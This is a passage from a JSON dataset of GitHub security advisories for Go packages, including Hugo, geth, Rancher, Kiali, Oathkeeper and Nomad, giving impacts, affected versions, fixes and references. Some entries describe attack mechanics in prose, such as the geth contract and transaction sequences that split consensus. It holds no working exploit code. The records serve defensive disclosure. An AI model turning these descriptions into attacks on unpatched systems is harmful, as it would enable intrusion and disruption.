"nvd_published_at": "2020-03-16T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8j34-9876-pvfq", "modified": "2021-05-21T18:15:45Z", "published": "2021-06-23T17:28:26Z", "aliases": ["CVE-2020-26284"], "summary": "Hugo can execute a binary from the current directory on Windows", "details": "## Impact\n\nHugo depends on Go's `os/exec` for certain features, e.g. for rendering of Pandoc documents if these binaries are found in the system `%PATH%` on Windows. However, if a malicious file with the same name (`exe` or `bat`) is found in the current working directory at the time of running `hugo`, the malicious command will be invoked instead of the system one.\n\nWindows users who run `hugo` inside untrusted Hugo sites are affected.\n\n## Patches\nUsers should upgrade to Hugo v0.79.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gohugoio/hugo"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.79.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gohugoio/hugo/security/advisories/GHSA-8j34-9876-pvfq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26284"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/38736"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T18:15:45Z", "nvd_published_at": "2020-12-21T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-69v6-xc2j-r2jf", "modified": "2023-10-03T10:13:29Z", "published": "2021-06-29T21:13:01Z", "aliases": ["CVE-2020-26241"], "summary": "Shallow copy bug in geth", "details": "### Impact\nThis is a Consensus vulnerability, which can be used to cause a chain-split where vulnerable nodes reject the canonical chain. \n\nGeth\u2019s pre-compiled `dataCopy` (at `0x00...04`) contract did a shallow copy on invocation. An attacker could deploy a contract that \n\n- writes `X` to an EVM memory region `R`,\n- calls `0x00..04` with `R` as an argument,\n- overwrites `R` to `Y`,\n- and finally invokes the `RETURNDATACOPY` opcode.\n\nWhen this contract is invoked, a consensus-compliant node would push `X` on the EVM stack, whereas Geth would push `Y`.\n### Specific Go Packages Affected\ngithub.com/ethereum/go-ethereum/core/vm\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.7"}, {"fixed": "1.9.17"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-69v6-xc2j-r2jf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26241"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/295693759e5ded05fec0b2fb39359965b60da785"}, {"type": "WEB", "url": "https://blog.ethereum.org/2020/11/12/geth_security_release/"}], "database_specific": {"cwe_ids": ["CWE-682"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:51:49Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9qq2-xhmc-h9qr", "modified": "2022-04-25T20:20:41Z", "published": "2021-06-23T17:57:10Z", "aliases": ["CVE-2018-20321"], "summary": "Access Control Bypass", "details": "An issue was discovered in Rancher 2 through 2.1.5. Any project member with access to the default namespace can mount the netes-default service account in a pod, and then use that pod to execute administrative privileged commands against the k8s cluster. This could be mitigated by isolating the default namespace in a separate project, where only cluster admins can be given permissions to access. As of 2018-12-20, this bug affected ALL clusters created or imported by Rancher.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-20321"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/commit/6ea187fcc2309d5a7a14ed47de5688bf6573f448"}, {"type": "WEB", "url": "https://forums.rancher.com/c/announcements"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.1.6"}, {"type": "WEB", "url": "https://rancher.com/blog/2019/2019-01-29-explaining-security-vulnerabilities-addressed-in-rancher-v2-1-6-and-v2-0-11/"}], "database_specific": {"cwe_ids": ["CWE-288", "CWE-668"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:10:58Z", "nvd_published_at": "2019-04-10T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hwqm-x785-qh8p", "modified": "2023-10-02T15:09:54Z", "published": "2021-06-23T17:52:33Z", "aliases": ["CVE-2020-12797"], "summary": "Incorrect Permission Assignment for Critical Resource\tin Hashicorp Consul", "details": "HashiCorp Consul and Consul Enterprise failed to enforce changes to legacy ACL token rules due to non-propagation to secondary data centers. Introduced in 1.4.0, fixed in 1.6.6 and 1.7.4.\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/agent/structs", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12797"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/issues/5606"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/8047"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/98eea08d3ba1b220a14cf6eedf3b6b07ae2795d7"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.6.6/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.7.4/CHANGELOG.md"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T22:03:39Z", "nvd_published_at": "2020-06-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv55-23xp-3wp8", "modified": "2021-06-15T19:56:20Z", "published": "2021-06-08T20:09:36Z", "aliases": ["CVE-2021-3495"], "summary": "Access control flaw in Kiali", "details": "An incorrect access control flaw was found in the kiali-operator in versions before 1.33.0. This flaw allows an attacker with a basic level of access to the cluster (to deploy a kiali operand) to use this vulnerability and deploy a given image to anywhere in the cluster, potentially gaining access to privileged service account tokens. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kiali/kiali"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.33.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3495"}, {"type": "WEB", "url": "https://github.com/kiali/kiali-operator/pull/278"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1947361"}, {"type": "WEB", "url": "https://kiali.io/news/security-bulletins/kiali-security-003/"}], "database_specific": {"cwe_ids": ["CWE-281"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-02T20:54:29Z", "nvd_published_at": "2021-06-01T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6rg3-8h8x-5xfv", "modified": "2021-10-05T17:24:11Z", "published": "2021-06-23T18:04:50Z", "aliases": [], "summary": "Unchecked hostname resolution could allow access to local network resources by users outside the local network", "details": "### Impact\nA newly implemented route allowing users to download files from remote endpoints was not properly verifying the destination hostname for user provided URLs. This would allow malicious users to potentially access resources on local networks that would otherwise be inaccessible.\n\nThis vulnerability requires valid authentication credentials and is therefore **not exploitable by unauthenticated users**. If you are running an instance for yourself or other trusted individuals this impact is unlikely to be of major concern to you. However, you should still upgrade for security sake.\n\n### Patches\nUsers should upgrade to the latest version of Wings.\n\n### Workarounds\nThere is no workaround available that does not involve modifying Panel or Wings code.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.0"}, {"fixed": "1.2.1"}]}], "versions": ["1.2.0"]}], "references": [{"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-6rg3-8h8x-5xfv"}, {"type": "PACKAGE", "url": "https://github.com/pterodactyl/wings"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-441"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-23T18:04:30Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9423-6c93-gpp8", "modified": "2023-08-29T23:36:50Z", "published": "2021-06-23T17:13:29Z", "aliases": ["CVE-2020-7667"], "summary": "github.com/sassoftware/go-rpmutils Arbitrary File Write via Archive Extraction (Zip Slip)", "details": "The CPIO extraction functionality doesn't sanitize the paths of the archived files for leading and non-leading `..` which leads in file extraction outside of the current directory. Note, the fixing commit was applied to all affected versions which were re-released.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sassoftware/go-rpmutils"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7667"}, {"type": "WEB", "url": "https://github.com/sassoftware/go-rpmutils/commit/a64058cf21b8aada501bba923c9aab66fb6febf0"}, {"type": "PACKAGE", "url": "https://github.com/sassoftware/go-rpmutils"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0042"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSASSOFTWAREGORPMUTILSCPIO-570427"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T14:56:04Z", "nvd_published_at": "2020-06-24T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfvf-6gx5-mqv6", "modified": "2021-06-23T20:38:29Z", "published": "2021-06-24T20:16:02Z", "aliases": ["CVE-2021-32701"], "summary": "Incorrect Authorization in ORY Oathkeeper", "details": "ORY Oathkeeper is an Identity & Access Proxy (IAP) and Access Control Decision API that authorizes HTTP requests based on sets of Access Rules. When you make a request to an endpoint that requires the scope `foo` using an access token granted with that `foo` scope, introspection will be valid and that token will be cached. The problem comes when a second requests to an endpoint that requires the scope `bar` is made before the cache has expired. Whether the token is granted or not to the `bar` scope, introspection will be valid. A patch will be released with `v0.38.12-beta.1`. Per default, caching is disabled for the `oauth2_introspection` authenticator. When caching is disabled, this vulnerability does not exist. The cache is checked in [`func (a *AuthenticatorOAuth2Introspection) Authenticate(...)`](https://github.com/ory/oathkeeper/blob/6a31df1c3779425e05db1c2a381166b087cb29a4/pipeline/authn/authenticator_oauth2_introspection.go#L152). From [`tokenFromCache()`](https://github.com/ory/oathkeeper/blob/6a31df1c3779425e05db1c2a381166b087cb29a4/pipeline/authn/authenticator_oauth2_introspection.go#L97) it seems that it only validates the token expiration date, but ignores whether the token has or not the proper scopes. The vulnerability was introduced in PR #424. During review, we failed to require appropriate test coverage by the submitter which is the primary reason that the vulnerability passed the review process.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/oathkeeper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.38.0-beta.2"}, {"fixed": "0.38.12-beta.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.38.11-beta.1"}}], "references": [{"type": "WEB", "url": "https://github.com/ory/oathkeeper/security/advisories/GHSA-qvp4-rpmr-xwrr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32701"}, {"type": "WEB", "url": "https://github.com/ory/oathkeeper/pull/424"}, {"type": "WEB", "url": "https://github.com/ory/oathkeeper/commit/1f9f625c1a49e134ae2299ee95b8cf158feec932"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-23T20:38:29Z", "nvd_published_at": "2021-06-22T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gq5r-cc4w-g8xf", "modified": "2023-08-30T18:52:39Z", "published": "2021-06-23T17:25:08Z", "aliases": [], "summary": "gosaml2 is vulnerable to NULL Pointer Dereference from malformed XML signatures", "details": "This affects all versions less than 0.7.0 of package github.com/russellhaering/gosaml2. There is a crash on null pointer dereference caused by sending malformed XML signatures.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7731"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/issues/59"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/issues/48"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/pull/90"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/commit/66e3b7affd622b8b24ea1e18845f045e46b23424"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/gosaml2"}, {"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/releases/tag/v0.7.0"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOSAML2-608302"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:39:22Z", "nvd_published_at": "2021-04-30T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ggjr-2f7v-vhq4", "modified": "2022-08-11T16:53:09Z", "published": "2021-06-01T21:57:08Z", "aliases": ["CVE-2021-20278"], "summary": "Kiali Authentication Bypass vulnerability", "details": "An authentication bypass vulnerability was found in Kiali in versions before 1.31.0 when the authentication strategy `OpenID` is used. When RBAC is enabled, Kiali assumes that some of the token validation is handled by the underlying cluster. When OpenID `implicit flow` is used with RBAC turned off, this token validation doesn't occur, and this allows a malicious user to bypass the authentication.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kiali/kiali"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.31.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20278"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1937171"}, {"type": "WEB", "url": "https://kiali.io/news/security-bulletins/kiali-security-002/"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-290"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-01T17:44:07Z", "nvd_published_at": "2021-05-28T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w942-gw6m-p62c", "modified": "2023-08-30T11:40:58Z", "published": "2021-06-23T17:53:05Z", "aliases": ["CVE-2020-35380"], "summary": "Denial of service in GJSON", "details": "GJSON before 1.6.4 allows attackers to cause a denial of service via crafted JSON. Due to improper bounds checking, maliciously crafted JSON objects can cause an out-of-bounds panic. If parsing user input, this may be used as a denial of service vector.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tidwall/gjson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-35380"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/192"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/f0ee9ebde4b619767ae4ac03e8e42addb530f6bc"}, {"type": "PACKAGE", "url": "https://github.com/tidwall/gjson"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0059"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:50:06Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-xw37-57qp-9mm4", "modified": "2023-02-09T19:40:33Z", "published": "2021-06-29T21:14:16Z", "aliases": ["CVE-2020-26265"], "summary": "Consensus flaw during block processing in github.com/ethereum/go-ethereum", "details": "### Impact\n\nA consensus-vulnerability in Geth could cause a chain split, where vulnerable versions refuse to accept the canonical chain. \n\n### Description\n\n\nA flaw was repoted at 2020-08-11 by John Youngseok Yang (Software Platform Lab), where a particular sequence of transactions could cause a consensus failure.\n\n- Tx 1:\n  - `sender` invokes `caller`.\n  - `caller` invokes `0xaa`. `0xaa` has 3 wei, does a self-destruct-to-self\n  - `caller` does a  `1 wei` -call to `0xaa`, who thereby has 1 wei (the code in `0xaa` still executed, since the tx is still ongoing, but doesn't redo the selfdestruct, it takes a different path if callvalue is non-zero)\n\n- Tx 2:\n  - `sender` does a 5-wei call to 0xaa. No exec (since no code). \n\nIn geth, the result would be that `0xaa` had `6 wei`, whereas OE reported (correctly) `5` wei. Furthermore, in geth, if the second tx was not executed, the `0xaa` would be destructed, resulting in `0 wei`. Thus obviously wrong. \n\nIt was determined that the root cause was this [commit](https://github.com/ethereum/go-ethereum/commit/223b950944f494a5b4e0957fd9f92c48b09037ad) from [this PR](https://github.com/ethereum/go-ethereum/pull/19953). The semantics of `createObject` was subtly changd, into returning a non-nil object (with `deleted=true`) where it previously did not if the account had been destructed. This return value caused the new object to inherit the old `balance`:\n\n```golang\nfunc (s *StateDB) CreateAccount(addr common.Address) {\n\tnewObj, prev := s.createObject(addr)\n\tif prev != nil {\n\t\tnewObj.setBalance(prev.data.Balance)\n\t}\n}\n```\n\nIt was determined that the minimal possible correct fix was\n\n```diff\n+++ b/core/state/statedb.go\n@@ -589,7 +589,10 @@ func (s *StateDB) createObject(addr common.Address) (newobj, prev *stateObject)\n                s.journal.append(resetObjectChange{prev: prev, prevdestruct: prevdestruct})\n        }\n        s.setStateObject(newobj)\n-       return newobj, prev\n+       if prev != nil && !prev.deleted {\n+               return newobj, prev\n+       }\n+       return newobj, nil\n```\n\n### Patches\n\nSee above. The fix was included in Geth `v1.9.20` \"Paragade\".\n\n### Credits\n\nThe bug was found by @johnyangk and reported via bounty@ethereum.org.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.4"}, {"fixed": "1.9.20"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-xw37-57qp-9mm4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26265"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/21080"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/21409"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/87c0ba92136a75db0ab2aba1046d4a9860375d6a"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.9.20"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0105"}], "database_specific": {"cwe_ids": ["CWE-682"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:15:07Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jj6m-r8jc-2gp7", "modified": "2022-10-25T20:24:52Z", "published": "2021-06-23T18:03:18Z", "aliases": ["CVE-2021-32699"], "summary": "Asymmetric Resource Consumption (Amplification) in Docker containers created by Wings ", "details": "### Impact\nAll versions of Pterodactyl Wings preior to `1.4.4` are vulnerable to system resource exhaustion due to improper container process limits being defined. A malicious user can consume more resources than intended and cause downstream impacts to other clients on the same hardware, eventually causing the physical server to stop responding.\n\n### Patches\nUsers should upgrade to `1.4.4`.\n\n### Workarounds\nThere is no non-code based workaround for impacted versions of the software. Users running customized versions of this software can manually set a PID limit for containers created.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us on [Discord](https://discord.gg/pterodactyl)\n* Email us at `dane \u00e4t pterodactyl dot io`", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pterodactyl/wings"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pterodactyl/wings/security/advisories/GHSA-jj6m-r8jc-2gp7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32699"}, {"type": "WEB", "url": "https://github.com/pterodactyl/wings/commit/e0078eee0a71d61573a94c75e6efcad069d78de3"}, {"type": "PACKAGE", "url": "https://github.com/pterodactyl/wings"}], "database_specific": {"cwe_ids": ["CWE-405", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-22T15:43:57Z", "nvd_published_at": "2021-06-22T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-399h-cmvp-qgx5", "modified": "2023-10-02T14:30:16Z", "published": "2021-06-29T21:32:11Z", "aliases": ["CVE-2020-12118"], "summary": "Incorrect Default Permissions in Binance tss-lib", "details": "The keygen protocol implementation in Binance tss-lib before 1.2.0 allows attackers to generate crafted h1 and h2 parameters in order to compromise a signing round or obtain sensitive information from other parties.\n### Specific Go Packages Affected\ngithub.com/binance-chain/tss-lib/ecdsa/keygen", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N/E:U/RL:O/RC:R"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/binance-chain/tss-lib"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12118"}, {"type": "WEB", "url": "https://github.com/binance-chain/tss-lib/pull/89"}, {"type": "WEB", "url": "https://github.com/binance-chain/tss-lib/pull/89/commits/7b7c17e90504d5dad94b938e84fec690bb1ec311"}, {"type": "WEB", "url": "https://github.com/binance-chain/tss-lib/releases/tag/v1.2.0"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-25T20:16:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qvp4-rpmr-xwrr", "modified": "2021-06-22T20:50:44Z", "published": "2021-06-23T18:00:20Z", "aliases": [], "summary": "Possible bypass of token claim validation when OAuth2 Introspection caching is enabled", "details": "### Impact\n\nWhen you make a request to an endpoint that requires the scope `foo` using an access token granted with that `foo` scope, introspection will be valid and that token will be cached. The problem comes when a second requests to an endpoint that requires the scope `bar` is made before the cache has expired. Whether the token is granted or not to the `bar` scope, introspection will be valid.\n\n### Patches\n\nA patch will be released with `v0.38.12-beta.1`.\n\n### Workarounds\n\nPer default, caching is disabled for the `oauth2_introspection` authenticator. When caching is disabled, this vulnerability does not exist.\n\n### Trace\n\nThe cache is checked in [`func (a *AuthenticatorOAuth2Introspection) Authenticate(...)`](https://github.com/ory/oathkeeper/blob/6a31df1c3779425e05db1c2a381166b087cb29a4/pipeline/authn/authenticator_oauth2_introspection.go#L152). From [`tokenFromCache()`](https://github.com/ory/oathkeeper/blob/6a31df1c3779425e05db1c2a381166b087cb29a4/pipeline/authn/authenticator_oauth2_introspection.go#L97) it seems that it only validates the token expiration date, but ignores whether the token has or not the proper scopes.\n\n### Post-Mortem\n\nThe vulnerability was introduced in PR #424. During review, we failed to require appropriate test coverage by the submitter which is the primary reason that the vulnerability passed the review process.\n\nTo avoid this from happening again we enabled codecov with a strict policy on the Ory Oathkeeper repository: Without an increase in code coverage the PR can not be merged.\n\nTo address this issue and any regressions we have added a test suite ensuring that the cache behaviour is correct in the different scenarios:\n\n- Scope strategy is `none`, cache is enabled, and `requested_scope` is not empty -> cache will not be used;\n- Scope strategy is `none`, cache is enabled, and `requested_scope` is empty -> cache will be used;\n- Scope strategy is not `none`, cache is enabled, and `requested_scope` is not empty -> cache will be used;\n\nas well as validating if `iss`, `aud`, `exp`, `token_use`, and scope are validated.\n\nAdditionally, we added [CodeQL scanning](https://github.com/ory/oathkeeper/commit/64ac7562669287d391cd72dfd43c5d71ff9f89a1) to the CI.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/oathkeeper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.38.0-beta.2"}, {"fixed": "0.38.12-beta.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.38.11-beta.1"}}], "references": [{"type": "WEB", "url": "https://github.com/ory/oathkeeper/security/advisories/GHSA-qvp4-rpmr-xwrr"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-22T20:50:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m6gx-rhvj-fh52", "modified": "2021-10-08T21:25:42Z", "published": "2021-06-29T21:13:54Z", "aliases": [], "summary": "Denial of service in go-ethereum due to CVE-2020-28362", "details": "### Impact\nVersions of Geth built with Go `<1.15.5` or `<1.14.12` are most likely affected by a critical DoS-related security vulnerability. The golang team has registered the underlying flaw as \u2018CVE-2020-28362\u2019.\n\nWe recommend all users to rebuild (ideally `v1.9.24`) with Go `1.15.5` or `1.14.12`, to avoid node crashes. Alternatively, if you are running binaries distributed via one of our official channels, we\u2019re going to release `v1.9.24` ourselves built with Go `1.15.5`.\n\n### Patches\nThis is not an issue in go-ethereum, rebuilding an older version with Go `1.15.5` or `1.14.12` will suffice to address the vulnerability. \n\n### Workarounds\nRebuilding with Go `1.15.5` or `1.14.12` will suffice to address the vulnerability. \n\n### References\n- https://blog.ethereum.org/2020/11/12/geth_security_release/\n- https://groups.google.com/g/golang-announce/c/NpBGTTmKzpM\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.24"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-m6gx-rhvj-fh52"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:49:12Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-vf6q-9f2f-mwhv", "modified": "2021-06-23T18:01:24Z", "published": "2021-06-24T20:28:21Z", "aliases": ["CVE-2021-32575"], "summary": "Improper network isolation in Hashicorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise up to version 1.0.4 bridge networking mode allows ARP spoofing from other bridged tasks on the same node. Fixed in 0.12.12, 1.0.5, and 1.1.0 RC1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": 